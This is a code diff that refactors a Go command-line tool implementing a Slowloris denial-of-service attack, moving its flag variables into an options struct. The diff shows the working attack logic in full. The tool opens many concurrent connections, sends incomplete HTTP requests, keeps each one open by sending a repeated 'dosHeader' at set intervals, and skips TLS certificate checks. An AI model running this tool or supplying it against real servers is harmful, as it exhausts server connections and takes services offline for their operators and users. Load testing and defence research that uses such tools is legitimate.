@@ -25,32 +25,34 @@ This disclaimer was shamelessy copied from sqlmap with minor modifications :)
     `
 )
 
+type options struct {
+	numConnections int
+	interval       int
+	timeout        int
+	method         string
+	resource       string
+	userAgent      string
+	target         string
+	https          bool
+	dosHeader      string
+	timermode      bool
+	finishAfter    int
+}
+
 func main() {
-	var (
-		numConnections int
-		interval       int
-		timeout        int
-		method         string
-		resource       string
-		userAgent      string
-		target         string
-		https          bool
-		dosHeader      string
-		timermode      bool
-		finishAfter    int
-	)
+	opts := options{}
 
 	flag.Usage = usage
-	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
-	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
-	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
-	flag.StringVar(&method, "method", "GET", "HTTP method to use")
-	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
-	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
-	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
-	flag.BoolVar(&https, "https", false, "Use HTTPS")
-	flag.BoolVar(&timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
-	flag.IntVar(&finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
+	flag.IntVar(&opts.numConnections, "connections", 10, "Number of active concurrent connections")
+	flag.IntVar(&opts.interval, "interval", 1, "Number of seconds to wait between sending headers")
+	flag.IntVar(&opts.timeout, "timeout", 60, "HTTP connection timeout in seconds")
+	flag.StringVar(&opts.method, "method", "GET", "HTTP method to use")
+	flag.StringVar(&opts.resource, "resource", "/", "Resource to request from the server")
+	flag.StringVar(&opts.userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
+	flag.StringVar(&opts.dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
+	flag.BoolVar(&opts.https, "https", false, "Use HTTPS")
+	flag.BoolVar(&opts.timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
+	flag.IntVar(&opts.finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
 	flag.Parse()
 
 	if len(flag.Args()) == 0 {
@@ -61,20 +63,20 @@ func main() {
 	signals := make(chan os.Signal, 1)
 	signal.Notify(signals, os.Interrupt, os.Kill)
 
-	target = flag.Args()[0]
-	if !strings.Contains(target, ":") {
-		if https {
-			target += ":443"
+	opts.target = flag.Args()[0]
+	if !strings.Contains(opts.target, ":") {
+		if opts.https {
+			opts.target += ":443"
 		} else {
-			target += ":80"
+			opts.target += ":80"
 		}
 	}
 
-	if timermode {
-		go timer(target, method, resource, timeout, https)
+	if opts.timermode {
+		go timer(opts)
 	} else {
-		for i := 0; i < numConnections; i++ {
-			go slowloris(target, dosHeader, method, resource, interval, timeout, finishAfter, https)
+		for i := 0; i < opts.numConnections; i++ {
+			go slowloris(opts)
 		}
 	}
 
@@ -104,18 +106,18 @@ func usage() {
 	fmt.Println(legalDisclaimer)
 }
 
-func timer(target, method, resource string, timeout int, https bool) {
+func timer(opts options) {
 	fmt.Printf("Timer mode activated. Use Ctrl+C to terminate the program.\n")
 	for {
-		d := getTimeout(target, method, resource, timeout, https)
+		d := getTimeout(opts)
 		fmt.Printf("Server closed the connection after %.2f seconds\n", d.Seconds())
 	}
 }
 
-func getTimeout(target, method, resource string, timeout int, https bool) time.Duration {
+func getTimeout(opts options) time.Duration {
 	start := time.Now()
 
-	conn, err := openConnection(target, timeout, https)
+	conn, err := openConnection(opts)
 	if err != nil {
 		fmt.Println("FATAL: " + err.Error())
 		os.Exit(-1)
@@ -130,14 +132,14 @@ func getTimeout(target, method, resource string, timeout int, https bool) time.D
 	panic("This should not happen!")
 }
 
-func slowloris(target, dosHeader, method, resource string, interval, timeout, finishAfter int, https bool) {
+func slowloris(opts options) {
 	var conn net.Conn
 	var err error
 
 	var timerChan <-chan time.Time
 	var timer *time.Timer
-	if finishAfter > 0 {
-		timer = time.NewTimer(time.Duration(finishAfter) * time.Second)
+	if opts.finishAfter > 0 {
+		timer = time.NewTimer(time.Duration(opts.finishAfter) * time.Second)
 		timerChan = timer.C
 	}
 
@@ -147,27 +149,27 @@ loop:
 			conn.Close()
 		}
 
-		conn, err = openConnection(target, timeout, https)
+		conn, err = openConnection(opts)
 		if err != nil {
 			continue
 		}
 
-		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
+		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", opts.method, opts.resource); err != nil {
 			continue
 		}
 
-		header := createHeader(target)
+		header := createHeader(opts.target)
 		if err = header.Write(conn); err != nil {
 			continue
 		}
 
 		for {
 			select {
-			case <-time.After(time.Duration(interval) * time.Second):
+			case <-time.After(time.Duration(opts.interval) * time.Second):
 				if timer != nil {
-					timer.Reset(time.Duration(finishAfter) * time.Second)
+					timer.Reset(time.Duration(opts.finishAfter) * time.Second)
 				}
-				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
+				if _, err := fmt.Fprintf(conn, "%s\r\n", opts.dosHeader); err != nil {
 					continue loop
 				}
 
@@ -183,19 +185,19 @@ loop:
 
 }
 
-func openConnection(host string, timeout int, https bool) (net.Conn, error) {
+func openConnection(opts options) (net.Conn, error) {
 	var conn net.Conn
 	var err error
-	timeoutDuration := time.Duration(timeout) * time.Second
+	timeoutDuration := time.Duration(opts.timeout) * time.Second
 
-	if https {
+	if opts.https {
 		config := &tls.Config{InsecureSkipVerify: true}
-		conn, err = tls.Dial("tcp", host, config)
+		conn, err = tls.Dial("tcp", opts.target, config)
 		if err != nil {
 			return nil, err
 		}
 	} else {
-		conn, err = net.DialTimeout("tcp", host, timeoutDuration)
+		conn, err = net.DialTimeout("tcp", opts.target, timeoutDuration)
 		if err != nil {
 			return nil, err
 		}
